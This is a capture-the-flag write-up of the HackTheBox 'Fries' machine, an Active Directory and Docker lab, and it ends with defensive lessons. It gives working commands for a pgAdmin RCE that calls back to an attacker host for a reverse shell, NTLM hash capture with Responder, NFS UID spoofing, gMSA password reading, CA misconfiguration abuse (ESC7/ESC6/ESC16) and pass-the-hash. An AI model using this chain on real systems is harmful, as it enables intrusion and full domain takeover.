# HackTheBox - Fries (Hard) - Full Writeup

**OS:** Windows Server 2019 (Active Directory) + Linux Docker Host  
**Difficulty:** Hard  
**Author:** HTB  
**Date:** March 5, 2026  

## Attack Chain Summary

```
Subdomain Enum → Gitea (creds in commit history) → pgAdmin CVE-2025-2945 RCE
→ Container env vars → SSH as svc → NFS + Docker TLS certs
→ PWM + Responder (svc_infra creds) → WinRM svc_infra → ReadGMSAPassword (gMSA_CA_prod$)
→ ADCS ESC7 → ESC6 + ESC16 → Administrator Certificate → Pass-the-Hash → Domain Admin
```

## Network Topology

```
┌─────────────┐         ┌──────────────────────┐         ┌─────────────────────┐
│   KALI      │         │       DC01           │         │    web (Linux)      │
│ 10.10.xx.xx │────────▶│ 10.129.x.x          │         │ 192.168.100.2       │
│             │  VPN    │ fries.htb             │◀───────▶│ Docker Host         │
│             │         │ AD CS: fries-DC01-CA  │ Internal│ NFS, SSH, Docker    │
│             │         │                      │         │ Containers:         │
│             │         │                      │         │  - Gitea            │
│             │         │                      │         │  - pgAdmin          │
│             │         │                      │         │  - PostgreSQL       │
│             │         │                      │         │  - PWM              │
└─────────────┘         └──────────────────────┘         └─────────────────────┘
```

---

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key services on DC01:
- 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S)
- 445 (SMB), 5985 (WinRM), 80/443 (HTTP/S)
- 2049 (NFS - externally filtered)

### Clock Synchronization

```bash
sudo ntpdate -u <TARGET_IP>
```

Critical for Kerberos — clock skew must be < 5 minutes.

### Subdomain Enumeration

```bash
ffuf -u http://<TARGET_IP> -H "Host: FUZZ.fries.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
```

Discovered subdomains:
| Subdomain | Service |
|-----------|---------|
| `code.fries.htb` | Gitea (Git repositories) |
| `db-mgmt05.fries.htb` | pgAdmin 4 v9.1 |

---

## 2. Gitea - Credentials in Commit History

Logged into `code.fries.htb` with provided credentials (user `dale`).

Found private repository `dale/fries.htb`. In the commit history, a "gitignore update" commit deleted an `.env` file containing credentials:

```bash
# Using the Gitea API to explore commits
curl -s "http://code.fries.htb/api/v1/repos/dale/fries.htb/git/commits/<COMMIT_HASH>" \
  -H "Authorization: token <TOKEN>"
```

Deleted `.env` contents:
```
DATABASE_URL=postgresql://root:<DB_PASSWORD>@172.18.0.3:5432/ps_db
SECRET_KEY=<REDACTED>
```

Staff names extracted from the "About" page:
- Emma Thompson → `e.thompson`
- Daniel Rodriguez → `d.rodriguez`
- Sarah Chen → `s.chen`

---

## 3. pgAdmin - CVE-2025-2945 (RCE)

pgAdmin 4 v9.1 is vulnerable to **CVE-2025-2945** — remote code execution via the authenticated Query Tool.

### Exploitation with Metasploit

```bash
msfconsole -q
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS <TARGET_IP>
set VHOST db-mgmt05.fries.htb
set USERNAME <PGADMIN_USER>
set PASSWORD <PGADMIN_PASSWORD>
set DATABASE ps_db
set RDBMS_USERNAME root
set RDBMS_PASSWORD <DB_PASSWORD>
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit
```

Obtained a Meterpreter shell inside the **pgAdmin container** (hostname `cb46692a4590`, IP `172.18.0.4`).

---

## 4. Pivot - Container Environment Variables

From the pgAdmin container shell, read environment variables:

```bash
env | grep -i pgadmin
```

Obtained `PGADMIN_DEFAULT_PASSWORD=<REDACTED>` — this password is reused for the `svc` user on the Linux host.

---

## 5. SSH as svc

```bash
ssh svc@fries.htb  # Password: <PGADMIN_DEFAULT_PASSWORD>
```

Accessed the Linux host (`web`, IP `192.168.100.2`), which is the Docker host running all containers.

### Host Enumeration

- **NFS export:** `/srv/web.fries.htb *` (rw, no_subtree_check, insecure, **root_squash** enabled)
- **Docker API:** `127.0.0.1:2376` with TLS + authz-broker plugin
- **Docker certs:** at `/etc/docker/certs/` (ca-key.pem and server-key.pem are root-only)
- **Certs directory:** `/srv/web.fries.htb/certs` (owned by `root:infra_managers`, AD group GID)

---

## 6. NFS + Docker TLS Certs

### NFS Mount with Fake UID

From Kali, used `sshuttle` to create a tunnel and access the Linux host's NFS:

```bash
sshuttle -r svc@fries.htb -N
```

Used `fuse_nfs` with `--fake-uid` to mount NFS and read protected Docker certificates:

```bash
fuse_nfs -n nfs://192.168.100.2/srv/web.fries.htb --fake-uid=0 /mnt/nfs
```

With the Docker TLS certificates, gained control of the Docker daemon and accessed containers.

---

## 7. PWM + Responder (svc_infra Credentials)

Configured PWM (Password Manager) to point to the attacker's IP as the LDAP server:

```bash
# From a Docker container with TLS certs
# Modified PWM configuration to set LDAP server = <ATTACKER_IP>
```

Started Responder to capture the NTLM hash when PWM tries to authenticate:

```bash
sudo responder -I tun0
```

Captured `svc_infra` hash and cracked it:

```
svc_infra:<REDACTED>
```

---

## 8. WinRM as svc_infra

```bash
evil-winrm -i <TARGET_IP> -u svc_infra -p '<PASSWORD>'
```

Accessed the DC as `svc_infra`. This account has **ReadGMSAPassword** permission on `gMSA_CA_prod$`.

### User Flag

```
user.txt: <REDACTED>
```

---

## 9. ReadGMSAPassword

Read the NTLM hash of the gMSA account:

```bash
bloodyAD --host <TARGET_IP> -d fries.htb -u svc_infra -p '<PASSWORD>' \
  get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

Obtained the NTLM hash of `gMSA_CA_prod$`: `<REDACTED>`

---

## 10. ADCS - ESC7 → ESC6 + ESC16

### ADCS Enumeration

```bash
certipy-ad find -u svc_infra -p '<PASSWORD>' -dc-ip <TARGET_IP> -vulnerable
```

Discovered that `gMSA_CA_prod$` has **ManageCA** over `fries-DC01-CA` → **ESC7**.

### ESC6 + ESC16 Configuration

From evil-winrm as `gMSA_CA_prod$`, used PSPKI to configure the CA:

```powershell
# Connect as gMSA
evil-winrm -i <TARGET_IP> -u 'gMSA_CA_prod$' -H <NTLM_HASH>

# Import PSPKI and configure
Import-Module PSPKI
$cr = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$cr.SetRootNode($true)

# ESC6: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 in EditFlags
$cr.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

# ESC16: Disable SID extension so it doesn't overwrite the requested SID
$cr.SetConfigEntry("1.3.6.1.4.1.311.25.2", "DisableExtensionList", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

### CA Restart

```powershell
certutil -shutdown
# Wait a few seconds
sc.exe start certsvc
```

### Certificate Request as Administrator

```bash
certipy-ad req -u "svc_infra" -p "<PASSWORD>" -dc-ip <TARGET_IP> \
  -ca 'fries-DC01-CA' -template 'User' \
  -upn 'administrator@fries.htb' \
  -sid 'S-1-5-21-<DOMAIN_SID>-500'
```

Obtained a certificate with UPN `administrator@fries.htb` and Administrator's SID.

---

## 11. Certificate Authentication → NT Hash

```bash
# Sync clock first
sudo ntpdate -u <TARGET_IP>

# Authenticate with certificate
certipy-ad auth -pfx administrator.pfx -dc-ip <TARGET_IP> \
  -username 'Administrator' -domain 'fries.htb'
```

Obtained Administrator's NT hash: `<REDACTED>`

---

## 12. Pass-the-Hash → Domain Admin

```bash
evil-winrm -i <TARGET_IP> -u 'Administrator' -H <NT_HASH>
```

### Root Flag

```
root.txt: <REDACTED>
```

---

## Lessons Learned

1. **Never commit secrets** — even if deleted later, they persist in Git history
2. **Password reuse** — pgAdmin password was reused for SSH
3. **CVE-2025-2945** — pgAdmin 4 < v9.2 is vulnerable to authenticated RCE
4. **NFS with root_squash** — can be bypassed with `fuse_nfs --fake-uid`
5. **ADCS ESC7** — ManageCA allows modifying CA configuration to enable ESC6+ESC16
6. **gMSA** — managed service accounts may have excessive permissions over PKI
7. **Docker TLS** — access to Docker certificates allows full daemon control

## Tools Used

- nmap, ffuf
- Gitea API
- Metasploit (CVE-2025-2945)
- sshpass, SSH
- sshuttle, fuse_nfs
- Responder
- evil-winrm
- bloodyAD
- certipy-ad
- PSPKI (PowerShell)

## References

- [CVE-2025-2945 - pgAdmin RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-2945)
- [Certipy - ADCS Abuse](https://github.com/ly4k/Certipy)
- [ESC7 - ManageCA Abuse](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [ESC16 - SID Extension Bypass](https://posts.specterops.io/adcs-esc16-esc17-a-new-era-of-adcs-attacks-f3e15e8d2f29)
- [PSPKI Module](https://www.pkisolutions.com/tools/pspki/)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [fuse_nfs](https://github.com/sahlberg/fuse-nfs)
